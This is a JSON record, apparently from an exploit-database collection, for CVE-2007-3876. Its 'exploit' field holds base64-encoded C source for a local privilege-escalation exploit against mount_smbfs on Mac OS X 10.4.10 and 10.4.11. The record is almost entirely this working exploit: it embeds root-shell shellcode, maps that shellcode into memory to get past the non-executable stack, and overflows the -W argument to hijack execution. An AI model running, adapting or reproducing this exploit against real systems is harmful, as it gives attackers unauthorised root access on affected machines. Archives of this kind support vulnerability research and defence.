{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIENvcHlyaWdodCAoQykgMjAwNy0yMDA4IFN1YnJlcHRpb24gTExDLiBBbGwgcmlnaHRzIHJlc2VydmVkLg0KICogVmlzaXQgaHR0cDovL2Jsb2cuc3VicmVwdGlvbi5jb20gZm9yIGV4cGxvaXQgZGV2ZWxvcG1lbnQgbm90ZXMuDQogKg0KICogUmVmZXJlbmNlczoNCiAqICAgQ1ZFLTIwMDctMzg3Ng0KICogICBodHRwOi8vZG9jcy5pbmZvLmFwcGxlLmNvbS9hcnRpY2xlLmh0bWw/YXJ0bnVtPTMwNzE3OQ0KICogICBodHRwOi8vc2VjbGlzdHMub3JnL2Z1bGxkaXNjbG9zdXJlLzIwMDcvRGVjLzA0NDUuaHRtbA0KICogICBodHRwOi8vbGFicy5pZGVmZW5zZS5jb20vaW50ZWxsaWdlbmNlL3Z1bG5lcmFiaWxpdGllcy9kaXNwbGF5LnBocD9pZD02MzMNCiAqICAgaHR0cDovL3BocmFjay5vcmcvaXNzdWVzLmh0bWw/aXNzdWU9NjQmaWQ9MTEjYXJ0aWNsZQ0KICogICBCSUQ6IGh0dHA6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzI2OTI2DQogKg0KICoNCiAqIE5vdGVzOg0KICogIFdlIGJ5cGFzcyBub24tZXhlY3V0YWJsZSBzdGFjayB2aWEgc2hhcmVkX3JlZ2lvbl9tYXBfZmlsZV9ucCgpLCBhcw0KICogIGRvY3VtZW50ZWQgaW4gYSBQaHJhY2sgNjQgYXJ0aWNsZSBieSBuZW1vLiBUaGlzIHRlY2huaXF1ZSBoYXMgYmVlbg0KICogIHJlc3RyaWN0ZWQgaW4gTGVvcGFyZCwgYnV0IHdvcmtzIHBlcmZlY3RseSBpbiBUaWdlci4gT3JpZ2luYWxseSB3ZQ0KICogIGRldmVsb3BlZCBhIFJ1YnkgZXhwbG9pdCBidXQgZ2l2ZW4gdGhlIHJlbGlhYmxlIG5hdHVyZSBvZiBuZW1vJ3MNCiAqICBhcHByb2FjaCwgd2UgZGVjaWRlZCBhIEMgcG9ydCB3b3VsZCBiZSB0aGUgYmVzdCBvcHRpb24uDQogKg0KICogQ29tcGlsZSB3aXRoOiBnY2MgLVdhbGwgbW91bnRfc21iZnNfcm9vdC5jIC1vIG1vdW50X3NtYmZzX3Jvb3QNCiAqIFZlcnNpb246IDEuMCAoK3RpZ2VyX3g4NikNCiAqDQogKiBEaXN0cmlidXRlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIFN1YnJlcHRpb24gT3BlbiBTb3VyY2UgTGljZW5zZSB2MS4wDQogKiBodHRwOi8vc3RhdGljLnN1YnJlcHRpb24uY29tL3B1YmxpYy9kb2N1bWVudHMvc3VicmVwdGlvbi1zb3NsLTEuMC50eHQNCiAqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN5cy9zeXNjYWxsLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8bWFjaC92bV9wcm90Lmg+DQojaW5jbHVkZSA8bWFjaC9pMzg2L3ZtX3R5cGVzLmg+DQojaW5jbHVkZSA8bWFjaC9zaGFyZWRfbWVtb3J5X3NlcnZlci5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojZGVmaW5lIEJBU0VfQUREUiAgICAgICAgICAgMHg5ZmZmZjAwMA0KI2RlZmluZSBQQURESU5HX1NJWkUgICAgICAgIDEwNDANCiNkZWZpbmUgUEFZTE9BRF9TSVpFICAgICAgICBQQURESU5HX1NJWkUgKyAyNA0KDQovKiBGcm9tIG9zZm1rL21hY2gvaTM4Ni92bV9wYXJhbS5oICovDQojZGVmaW5lIEkzODZfUEdCWVRFUyAgICAgICAgNDA5Ng0KI2RlZmluZSBJMzg2X1BHU0hJRlQgICAgICAgIDEyDQojZGVmaW5lIFBBR0VfU0laRSAgICAgICAgICAgSTM4Nl9QR0JZVEVTDQojZGVmaW5lIFBBR0VfU0hJRlQgICAgICAgICAgSTM4Nl9QR1NISUZUDQoNCnN0cnVjdCBfc2hhcmVkX3JlZ2lvbl9tYXBwaW5nX25wIHsNCiAgICBtYWNoX3ZtX2FkZHJlc3NfdCAgIGFkZHJlc3M7DQogICAgbWFjaF92bV9zaXplX3QgICAgICBzaXplOw0KICAgIG1hY2hfdm1fb2Zmc2V0X3QgICAgZmlsZV9vZmZzZXQ7DQogICAgdm1fcHJvdF90ICAgICAgICAgICBtYXhfcHJvdDsNCiAgICB2bV9wcm90X3QgICAgICAgICAgIGluaXRfcHJvdDsNCn07DQoNCnN0cnVjdCB4ODZfdGFyZ2V0IHsNCiAgICBjaGFyIGVieFs0XTsNCiAgICBjaGFyIGVzaVs0XTsNCiAgICBjaGFyIGVkaVs0XTsNCiAgICBjaGFyIGVicFs0XTsNCiAgICBjaGFyIGVpcFs0XTsNCiAgICBjaGFyIHNhdmVkX2VpcFs0XTsNCiAgICBjaGFyIGV4dHJhX2FyZ1s0XTsNCn07DQoNCnN0YXRpYyBpbnQgZm9yY2VfZXhwbG9pdCA9IDA7DQoNCi8qIER1YWwgUG93ZXJQQyArIElBMzIgc2hlbGxjb2RlIGJ5IG5lbW8gYW5kIGItcjAwdC4NCiAqIHNldGV1aWQoMCkgKyBzZXR1aWQoMCkgKyBleGVjdmUoKQ0KICovDQpzdGF0aWMgY2hhciBkdWFsX3NoZWxsY29kZVtdID0NCiJceDVmXHg5MFx4ZWJceDYwXHgzOFx4MDBceDAwXHhiN1x4MzhceDYwXHgwMFx4MDBceDQ0XHgwMFx4MDBceDAyIg0KIlx4MzhceDAwXHgwMFx4MTdceDM4XHg2MFx4MDBceDAwXHg0NFx4MDBceDAwXHgwMlx4N2NceGE1XHgyYVx4NzkiDQoiXHg0MFx4ODJceGZmXHhmZFx4N2RceDY4XHgwMlx4YTZceDNiXHhlYlx4MDFceDcwXHgzOVx4NDBceDAxXHg3MCINCiJceDM5XHgxZlx4ZmVceGNmXHg3Y1x4YThceDI5XHhhZVx4MzhceDdmXHhmZVx4YzhceDkwXHg2MVx4ZmZceGY4Ig0KIlx4OTBceGExXHhmZlx4ZmNceDM4XHg4MVx4ZmZceGY4XHgzOFx4MGFceGZlXHhjYlx4NDRceGZmXHhmZlx4MDIiDQoiXHg3Y1x4YTNceDJiXHg3OFx4MzhceDBhXHhmZVx4OTFceDQ0XHhmZlx4ZmZceDAyXHgyZlx4NjJceDY5XHg2ZSINCiJceDJmXHg3M1x4NjhceDU4XHgzMVx4YzBceDUwXHhiMFx4YjdceDZhXHg3Zlx4Y2RceDgwXHgzMVx4YzBceDUwIg0KIlx4YjBceDE3XHg2YVx4N2ZceGNkXHg4MFx4MzFceGMwXHg1MFx4NjhceDJmXHgyZlx4NzNceDY4XHg2OFx4MmYiDQoiXHg2Mlx4NjlceDZlXHg4OVx4ZTNceDUwXHg1NFx4NTRceDUzXHg1M1x4YjBceDNiXHhjZFx4ODAiOw0KDQovKiBVbmxlc3Mgd2UgYXJlIGZvcmNpbmcgdGhlIGV4cGxvaXQsIGV4aXQgdGhlIHByb2Nlc3MgKi8NCnZvaWQgY29uZF9leGl0KGludCBleGl0Y29kZSkgew0KICAgIGlmICghZm9yY2VfZXhwbG9pdCkNCiAgICAgICAgZXhpdChleGl0Y29kZSk7DQp9DQoNCi8qIG1hcF9zaGVsbGNvZGUodm9pZCkgLSByZXR1cm5zIGEgcmV0dXJuIGFkZHJlc3MgYXMgdW5zaWduZWQgbG9uZw0KICogVGhlIHJldHVybmVkIGFkZHJlc3MgcG9pbnRzIHRvIG91ciBzaGVsbGNvZGUsIG1hcHBlZCBmcm9tIGEgdGVtcG9yYXJ5IGZpbGUgb24gZGlzay4NCiAqIE1vc3Qgb2YgdGhpcyBjb2RlIGlzIGJhc2VkIG9uIG5lbW8ncyBvcmlnaW5hbCBleGFtcGxlIGluIGhpcyBQaHJhY2sgNjQgYXJ0aWNsZS4NCiAqIElmIHRoZSBtYXBwaW5nIGV4aXN0cywgaXQgd2lsbCBmYWlsIGFuZCByZXF1aXJlIC1mIGZsYWcgdG8gYmUgdXNlZCBmb3IgYXZvaWRpbmcNCiAqIHRoZSBleGl0KCkgY2FsbHMuDQogKi8NCnVuc2lnbmVkIGxvbmcgbWFwX3NoZWxsY29kZSh2b2lkKSB7DQogICAgaW50IGZkID0gLTE7DQogICAgdW5zaWduZWQgbG9uZyBzaGVsbGNvZGVhZGRyID0gMHgwOw0KICAgIHN0cnVjdCBfc2hhcmVkX3JlZ2lvbl9tYXBwaW5nX25wIHNobXJlZzsNCiAgICBjaGFyIHRtcGJ1ZltQQUdFX1NJWkVdOw0KICAgIGNoYXIgKnRtcGZuYW1lOw0KICAgIHZvaWQgKnNjcHRyID0gTlVMTDsNCg0KICAgIG1lbXNldCh0bXBidWYsIDB4OTAsIHNpemVvZih0bXBidWYpKTsNCiAgICBzY3B0ciA9ICh0bXBidWYgKyBQQUdFX1NJWkUgLSBzaXplb2YoZHVhbF9zaGVsbGNvZGUpKTsNCg0KICAgIHNobXJlZy5hZGRyZXNzICAgICA9IEJBU0VfQUREUjsNCiAgICBzaG1yZWcuc2l6ZSAgICAgICAgPSBQQUdFX1NJWkU7DQogICAgc2htcmVnLmZpbGVfb2Zmc2V0ID0gMDsNCiAgICBzaG1yZWcubWF4X3Byb3QgICAgPSBWTV9QUk9UX0VYRUNVVEV8Vk1fUFJPVF9SRUFEfFZNX1BST1RfV1JJVEU7DQogICAgc2htcmVnLmluaXRfcHJvdCAgID0gVk1fUFJPVF9FWEVDVVRFfFZNX1BST1RfUkVBRHxWTV9QUk9UX1dSSVRFOw0KDQogICAgdG1wZm5hbWUgPSAiL3RtcC9pQ2hhdC5zb2NrIjsNCiAgICBpZiAoKGZkID0gb3Blbih0bXBmbmFtZSwgT19SRFdSfE9fQ1JFQVQpKSA9PSAtMSkgew0KICAgICAgICBwZXJyb3IoIm9wZW4iKTsNCiAgICAgICAgY29uZF9leGl0KEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KDQogICAgbWVtY3B5KHNjcHRyLCBkdWFsX3NoZWxsY29kZSwgc2l6ZW9mKGR1YWxfc2hlbGxjb2RlKSk7DQoNCiAgICBpZiAod3JpdGUoZmQsIHRtcGJ1ZiwgUEFHRV9TSVpFKSAhPSBQQUdFX1NJWkUpIHsNCiAgICAgICAgcGVycm9yKCJ3cml0ZSIpOw0KICAgICAgICBjbG9zZShmZCk7DQogICAgICAgIGNvbmRfZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICAgIGlmIChzeXNjYWxsKFNZU19zaGFyZWRfcmVnaW9uX21hcF9maWxlX25wLCBmZCwgMSwgJnNobXJlZywgTlVMTCkgPT0gLTEpIHsNCiAgICAgICAgcGVycm9yKCJzaGFyZWRfcmVnaW9uX21hcF9maWxlX25wIik7DQoNCiAgICAgICAgY2xvc2UoZmQpOw0KICAgICAgICBpZiAodW5saW5rKHRtcGZuYW1lKSA9PSAtMSkNCiAgICAgICAgICAgIHBlcnJvcigidW5saW5rIik7DQoNCiAgICAgICAgY29uZF9leGl0KEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KDQogICAgaWYgKGNsb3NlKGZkKSA9PSAtMSkNCiAgICAgICAgcGVycm9yKCJjbG9zZSIpOw0KDQogICAgaWYgKHVubGluayh0bXBmbmFtZSkgPT0gLTEpDQogICAgICAgIHBlcnJvcigidW5saW5rIik7DQoNCiAgICBzaGVsbGNvZGVhZGRyID0gKHVuc2lnbmVkIGxvbmcpKHNobXJlZy5hZGRyZXNzICsgUEFHRV9TSVpFIC0gc2l6ZW9mKGR1YWxfc2hlbGxjb2RlKSk7DQoNCiAgICBmcHJpbnRmKHN0ZG91dCwgIlNoZWxsY29kZSBtYXBwZWQ6IG1hcHBpbmcgc3RhcnRzIGF0IDB4JXgsIHNoZWxsY29kZSBhdCAleFxuIiwNCiAgICAgICAgICAgICh1bnNpZ25lZClzaG1yZWcuYWRkcmVzcywgKHVuc2lnbmVkKXNoZWxsY29kZWFkZHIpOw0KDQogICAgcmV0dXJuIHNoZWxsY29kZWFkZHI7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogICAgc3RydWN0IHg4Nl90YXJnZXQgcGF5bG9hZF90ZW1wbGF0ZTsNCiAgICB1bnNpZ25lZCBsb25nIHJldGFkZHIgPSAweDA7DQogICAgY2hhciBwYXlsb2FkW1BBWUxPQURfU0laRV07DQogICAgdm9pZCAqY3VycHRyID0gTlVMTDsNCg0KICAgIGNoYXIgKnZ1bG5fYXJndltdID0gew0KICAgICAgICAibW91bnRfc21iZnMiLA0KICAgICAgICAiLVciLA0KICAgICAgICAiUExBQ0VIT0xERVIiLA0KICAgICAgICAwDQogICAgfTsNCg0KICAgIGNoYXIgKnZ1bG5fZW52cFtdID0gew0KICAgICAgICAiSElTVEZJTEU9L2Rldi9udWxsIiwNCiAgICAgICAgIlRFUk09eHRlcm0tY29sb3IiLA0KICAgICAgICAiUEFUSD0vYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbiIsDQogICAgICAgICJISVNUU0laRT0xIiwNCiAgICAgICAgMA0KICAgIH07DQoNCiAgICBmcHJpbnRmKHN0ZG91dCwgIk1hYyBPUyBYIDEwLjQuMTAsIDEwLjQuMTEgbW91bnRfc21iZnMgTG9jYWwgUm9vdCBleHBsb2l0XG4iDQogICAgICAgICAgICAiQ29weXJpZ2h0IChjKSAyMDA3LTIwMDggU3VicmVwdGlvbiBMTEMuIEFsbCByaWdodHMgcmVzZXJ2ZWQuXG4iKTsNCg0KICAgIGlmIChhcmdjID4gMSkgew0KICAgICAgICBpZiAoIXN0cmNtcChhcmd2WzFdLCAiLWYiKSkNCiAgICAgICAgICAgIGZvcmNlX2V4cGxvaXQgPSAxOw0KICAgIH0NCiAgICANCiAgICByZXRhZGRyID0gbWFwX3NoZWxsY29kZSgpOw0KDQogICAgZnByaW50ZihzdGRvdXQsICJQYXlsb2FkIHNpemU6ICV1ICgldSBwYWRkaW5nIGJ5dGVzKSwgUmV0dXJuIGFkZHJlc3M6IDB4JXhcbiIsDQogICAgICAgICAgICAodW5zaWduZWQpc2l6ZW9mKHBheWxvYWQpLCBQQURESU5HX1NJWkUsICh1bnNpZ25lZClyZXRhZGRyKTsNCg0KICAgIG1lbXNldCgmcGF5bG9hZF90ZW1wbGF0ZSwgMCwgc2l6ZW9mKHBheWxvYWRfdGVtcGxhdGUpKTsNCg0KICAgIC8vIENvcHkgdGhlIGNvcnJlY3QgYWRkcmVzc2VzIHRvIHRoZSBwYXlsb2FkX3RlbXBsYXRlIHN0cnVjdHVyZQ0KICAgIG1lbWNweShwYXlsb2FkX3RlbXBsYXRlLmVieCwgIlx4ZmVceGNhXHhmZVx4Y2EiLCA0KTsgLy8gZWJ4ID0gMHhjYWZlY2FmZQ0KICAgIG1lbWNweShwYXlsb2FkX3RlbXBsYXRlLmVzaSwgIlx4ZGRceGNlXHhmYVx4ZGUiLCA0KTsgLy8gZXNpID0gMHhkZWZhY2VkZA0KICAgIG1lbWNweShwYXlsb2FkX3RlbXBsYXRlLmVkaSwgIlx4Y2VceGZhXHhlZFx4ZmUiLCA0KTsgLy8gZWRpID0gMHhmZWVkZmFjZQ0KICAgIG1lbWNweShwYXlsb2FkX3RlbXBsYXRlLmVicCwgIlx4ZWZceGZlXHhhZFx4ZGUiLCA0KTsgLy8gZWJwID0gMHhkZWFkYmVlZg0KICAgIG1lbWNweShwYXlsb2FkX3RlbXBsYXRlLmVpcCwgJnJldGFkZHIsIDQpOyAgICAgICAgICAgLy8gZWlwID0gcmV0YWRkcg0KDQogICAgbWVtY3B5KHBheWxvYWRfdGVtcGxhdGUuc2F2ZWRfZWlwLCAiXHhkMFx4MDJceDAxXHg5MCIsIDQpOyAvLyBzYXZlZCBlaXAgPSBleGl0KCkNCiAgICBtZW1jcHkocGF5bG9hZF90ZW1wbGF0ZS5leHRyYV9hcmcsICJceGZkXHhmOFx4ZmZceGJmIiwgNCk7IC8vIGV4dHJhIGFyZyA9IDB4YmZmZmY4ZmQNCg0KICAgIC8vIEZpbGwgdGhlIHBheWxvYWQgd2l0aCB0aGUgaW5pdGlhbCBwYWRkaW5nDQogICAgY3VycHRyID0gKHZvaWQgKilwYXlsb2FkOw0KICAgIG1lbXNldChjdXJwdHIsIDB4NDEsIFBBRERJTkdfU0laRSk7DQoNCiAgICAvLyBDb3B5IHRoZSBwYXlsb2FkX3RlbXBsYXRlIHN0cnVjdHVyZSB0byBvdXIgcGF5bG9hZCBidWZmZXINCiAgICBjdXJwdHIgPSBwYXlsb2FkICsgUEFERElOR19TSVpFOw0KICAgIG1lbWNweShjdXJwdHIsICZwYXlsb2FkX3RlbXBsYXRlLCBzaXplb2YocGF5bG9hZF90ZW1wbGF0ZSkpOw0KDQogICAgLy8gU2V0IHRoZSB2YWx1ZSB0byB0aGUgLVcgb3B0aW9uIHRvIHBvaW50IGF0IG91ciBwYXlsb2FkDQogICAgdnVsbl9hcmd2WzJdID0gKGNoYXIgKilwYXlsb2FkOw0KDQogICAgaWYgKGV4ZWN2ZSgiL3NiaW4vbW91bnRfc21iZnMiLCB2dWxuX2FyZ3YsIHZ1bG5fZW52cCkgPT0gLTEpIHsNCiAgICAgICAgcGVycm9yKCJleGVjdmUiKTsNCiAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICAgIHJldHVybiAwOw0KfQ0KDQovLyBtaWx3MHJtLmNvbSBbMjAwNy0xMi0xOV0=", 
    "filename": "platforms/osx/local/4759.c", 
    "id": "4759", 
    "cves": [
        "CVE-2007-3876"
    ]
}